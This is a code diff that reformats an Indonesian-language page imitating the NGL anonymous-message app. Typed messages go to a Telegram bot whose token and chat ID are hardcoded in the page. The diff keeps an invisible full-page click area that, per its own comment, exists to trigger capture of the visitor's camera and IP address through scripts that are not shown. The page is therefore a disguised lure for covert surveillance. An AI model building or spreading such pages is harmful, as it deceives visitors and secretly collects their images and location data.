@@ -49,49 +49,48 @@
           <!-- textarea -->
           <textarea id="msg" class="ngl-textarea w-full h-36 p-4 resize-none" placeholder="Ketik pesan anonimmu di sini..."></textarea>
 
-<!-- controls -->
-<div class="mt-4 flex items-center gap-3">
-  <button id="dice" class="w-10 h-10 rounded-full bg-pink-50 flex items-center justify-center ring-1 ring-pink-100 text-xl">
-    🎲
-  </button>
+          <!-- controls -->
+          <div class="mt-4 flex items-center gap-3">
+            <button id="dice" class="w-10 h-10 rounded-full bg-pink-50 flex items-center justify-center ring-1 ring-pink-100 text-xl">
+              🎲
+            </button>
 
-  <div class="flex-1"></div>
+            <div class="flex-1"></div>
 
-  <button id="sendBtn" class="send-btn bg-black text-white px-5 py-3 rounded-full font-semibold shadow-md hover:scale-[1.02] transition">
-    Send!
-  </button>
-</div>
-
-      <!-- footer small -->
-      <div class="px-5 py-4 border-t flex items-center justify-between">
-        <div class="text-sm text-muted flex items-center gap-2">
-          <i class="fas fa-lock"></i>
-          <span>100% anonymous Q&amp;A</span>
+            <button id="sendBtn" class="send-btn bg-black text-white px-5 py-3 rounded-full font-semibold shadow-md hover:scale-[1.02] transition">
+              Send!
+            </button>
+          </div>
         </div>
-        <div class="text-sm text-pink-500 font-semibold cursor-pointer" id="createLink">Buat linkmu</div>
+
+        <!-- footer small -->
+        <div class="px-5 py-4 border-t flex items-center justify-between">
+          <div class="text-sm text-muted flex items-center gap-2">
+            <i class="fas fa-lock"></i>
+            <span>100% anonymous Q&amp;A</span>
+          </div>
+          <div class="text-sm text-pink-500 font-semibold cursor-pointer" id="createLink">Buat linkmu</div>
+        </div>
       </div>
+
+      <!-- dynamic area: recent messages -->
+      <div id="recentArea" class="mt-6 space-y-3"></div>
+
+      <!-- create link CTA -->
+      <div class="mt-8 text-center text-white">
+        <div class="text-lg font-semibold">👇 Dapatkan pesan untukmu sendiri 👇</div>
+        <button id="makeLink" class="makeLinkBtn">Buat link anonim kamu</button>
+      </div>
+
+      <!-- status hidden -->
+      <div id="status" class="mt-2 text-sm text-yellow-500 text-center"></div>
     </div>
-
-    <!-- dynamic area: recent messages -->
-    <div id="recentArea" class="mt-6 space-y-3"></div>
-
-    <!-- create link CTA -->
-    <div class="mt-8 text-center text-white">
-      <div class="text-lg font-semibold">👇 Dapatkan pesan untukmu sendiri 👇</div>
-      <button id="makeLink" class="makeLinkBtn">Buat link anonim kamu</button>
-    </div>
-
-    <!-- status hidden -->
-    <div id="status" class="mt-2 text-sm text-yellow-500 text-center"></div>
   </div>
 
   <!-- invisible area buat trigger kamera & ip -->
   <div id="clickArea"></div>
 
-  <script src="script.js"></script>
-      !-- invisible area buat trigger kamera & ip -->
-  <div id="clickArea"></div>
-
+  <!-- script utama -->
   <script src="script.js"></script>
 
   <!-- trigger clickArea -->
@@ -118,69 +117,68 @@
       });
     });
   </script>
-</body>
-    </html>
-document.addEventListener("DOMContentLoaded", () => {
-  // --- list pertanyaan random ala NGL ---
-  const randomQuestions = [
-    "Siapa crush kamu sekarang?",
-    "Hal paling random yang bikin kamu senyum?",
-    "Kapan terakhir kali kamu nangis?",
-    "Siapa orang yang paling sering kamu chat?",
-    "Kalau bisa balik ke masa lalu, kamu mau ngapain?",
-    "Rahasia kecil yang belum pernah kamu ceritain?",
-    "Apa hal paling bikin kamu malu?",
-    "Siapa orang yang kamu kangenin banget?",
-    "Kalau ada yang mau nembak kamu, kamu mau gimana?",
-    "Hal paling cringe yang pernah kamu lakuin?"
-  ];
 
-  const diceBtn = document.getElementById("dice");
-  const sendBtn = document.getElementById("sendBtn");
-  const msgBox  = document.getElementById("msg");
-  const recentArea = document.getElementById("recentArea");
-  const status = document.getElementById("status");
+  <!-- randomQuestions + tombol 🎲 + Send -->
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const randomQuestions = [
+        "Siapa crush kamu sekarang?",
+        "Hal paling random yang bikin kamu senyum?",
+        "Kapan terakhir kali kamu nangis?",
+        "Siapa orang yang paling sering kamu chat?",
+        "Kalau bisa balik ke masa lalu, kamu mau ngapain?",
+        "Rahasia kecil yang belum pernah kamu ceritain?",
+        "Apa hal paling bikin kamu malu?",
+        "Siapa orang yang kamu kangenin banget?",
+        "Kalau ada yang mau nembak kamu, kamu mau gimana?",
+        "Hal paling cringe yang pernah kamu lakuin?"
+      ];
 
-  // --- tombol 🎲 ---
-  diceBtn.addEventListener("click", () => {
-    const random = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
-    msgBox.value = random;
-  });
+      const diceBtn = document.getElementById("dice");
+      const sendBtn = document.getElementById("sendBtn");
+      const msgBox  = document.getElementById("msg");
+      const recentArea = document.getElementById("recentArea");
+      const status = document.getElementById("status");
 
-  // --- tombol Send! ---
-  sendBtn.addEventListener("click", async () => {
-    const text = msgBox.value.trim();
-    if (!text) {
-      alert("Isi dulu pesannya bro 😅");
-      return;
-    }
-
-    // ⚠️ Ganti sesuai BOT kamu
-    const TOKEN = "7673116033:AAFM3bM-phhJKBVq4OsLCnkPGDuqjcaRW2c";
-    const CHAT_ID = "7483495590";
-
-    try {
-      // kirim ke Telegram
-      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text })
+      // tombol 🎲
+      diceBtn.addEventListener("click", () => {
+        const random = randomQuestions[Math.floor(Math.random() * randomQuestions.length)];
+        msgBox.value = random;
       });
 
-      // tampilkan di recent
-      const div = document.createElement("div");
-      div.className = "p-4 rounded-xl bg-white shadow-sm text-sm text-gray-700";
-      div.innerText = text;
-      recentArea.prepend(div);
+      // tombol Send!
+      sendBtn.addEventListener("click", async () => {
+        const text = msgBox.value.trim();
+        if (!text) {
+          alert("Isi dulu pesannya bro 😅");
+          return;
+        }
 
-      msgBox.value = "";
-      status.innerText = "✅ Pesan terkirim!";
-      setTimeout(() => status.innerText = "", 2000);
-    } catch (err) {
-      console.error(err);
-      status.innerText = "❌ Gagal kirim pesan";
-    }
-  });
-});
-    </script>
-    </html>
+        // ⚠️ Ganti sesuai BOT kamu
+        const TOKEN = "7673116033:AAFM3bM-phhJKBVq4OsLCnkPGDuqjcaRW2c";
+        const CHAT_ID = "7483495590";
+
+        try {
+          await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text })
+          });
+
+          const div = document.createElement("div");
+          div.className = "p-4 rounded-xl bg-white shadow-sm text-sm text-gray-700";
+          div.innerText = text;
+          recentArea.prepend(div);
+
+          msgBox.value = "";
+          status.innerText = "✅ Pesan terkirim!";
+          setTimeout(() => status.innerText = "", 2000);
+        } catch (err) {
+          console.error(err);
+          status.innerText = "❌ Gagal kirim pesan";
+        }
+      });
+    });
+  </script>
+</body>
+</html>
